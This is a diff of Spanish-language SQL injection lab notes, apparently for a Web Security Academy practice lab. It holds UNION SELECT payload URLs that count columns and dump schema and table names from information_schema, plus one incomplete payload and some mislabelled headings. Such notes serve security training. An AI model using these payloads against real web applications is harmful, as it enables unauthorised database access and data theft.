@@ -70,13 +70,19 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT n
 # Working!!! Visible - Contando Columnas en registro que estoy (total = 2) 
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -
 
+### DUMP: schema, tables, columns
+
+    # OJO!!! `Depende el lado de la inyección irá el "UNION SELECT <--> schema_name"`
+
 ## Opt1 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
-https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',schema_name FROM information_schema.schemata -- -
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
 ## Opt2 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT schema_name,'2' FROM information_schema.schemata -- -
 
-## Dump: table_name = DBs
-https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',table_name FROM table_schema.schemata WHERE information_schema = database()  -- -
+## Opt1 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables WHERE  -- -
+## Opt2 - Dump: schema_name = DBs [DUMP = DB = pg_catalog] 
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables -- -
 
 
 ````
